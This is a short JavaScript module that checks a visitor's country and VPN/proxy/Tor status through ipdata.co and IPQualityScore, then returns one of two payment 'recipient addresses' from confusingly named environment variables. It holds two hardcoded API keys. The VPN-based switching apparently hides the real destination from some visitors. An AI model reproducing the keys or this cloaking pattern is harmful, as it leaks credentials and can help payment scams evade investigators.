import axios from "axios";

// API keys for ipdata.co and IPQualityScore
const IPDATA_API_KEY = '10a6e15ee1f90f649b1ac40f8c699b1815f411748587388277cc2664';
const IPQS_API_KEY = 'qbBonEwKytWaDVnehOf7cSBvxVeVtogr';

// Fetch user data including VPN status, country, and IP from ipdata.co
export async function getUserCountry() {
  const url = `https://api.ipdata.co/?api-key=${IPDATA_API_KEY}`;

  try {
    const response = await axios.get(url);
    const { country_name: country, country_code: countryCode, ip, threat } = response.data;

    // Determine if the user is using a VPN (based on threat object)
    const isVpnIpdata = threat ? (threat.is_vpn || threat.is_proxy || threat.is_datacenter || threat.is_tor) : false;

    return { country, countryCode, ip, isVpnIpdata };
  } catch (error) {
    console.error("Error fetching user data from ipdata.co:", error);
    return null;
  }
}

// Check VPN status using IPQualityScore API (through Vite proxy)
export async function checkVpnStatusWithIPQS(ip) {
  const ipqsUrl = `/ipqualityscore/api/json/ip/${IPQS_API_KEY}/${ip}?strictness=1`; // Using proxy path

  try {
    const response = await axios.get(ipqsUrl);
    const { vpn, proxy, tor, active_vpn } = response.data;

    // Determine if IPQualityScore detects a VPN
    const isVpnIPQS = vpn || proxy || tor || active_vpn;
    
    return isVpnIPQS;
  } catch (error) {
    console.error("Error fetching VPN status from IPQualityScore:", error);
    return false;
  }
}

// Get the recipient address based on the user's VPN status and country code
export async function getRecipientAddress() {
  // Get the user's data from ipdata.co
  const userData = await getUserCountry();

  if (!userData) {
    console.error("Failed to retrieve user data");
    return null;
  }

  const { country, countryCode, ip, isVpnIpdata } = userData;

  // Check VPN status via IPQualityScore
  const isVpnIPQS = await checkVpnStatusWithIPQS(ip);

  // If either ipdata.co or IPQualityScore detects a VPN, log "VPN SUSPECTED"
  if (isVpnIpdata || isVpnIPQS) {
    console.log("VPN SUSPECTED. User's IP is associated with a VPN.");
    const addrEss = import.meta.env.VITE_REACT_APP_r;
    return addrEss;
  }

  // If neither service detects a VPN, log "No VPN"
  console.log("No VPN detected.");
  const specialCountries = ["NG", "US", "GB", "AE", "CA"];
  const address = import.meta.env.VITE_REACT_APP_R;
  const addrEss = import.meta.env.VITE_REACT_APP_r;

  console.log(`User is from ${country} (${countryCode})`);

  // Return the address based on the user's country code
  const recipientAddress = specialCountries.includes(countryCode) ? address : addrEss;
  return recipientAddress;
}
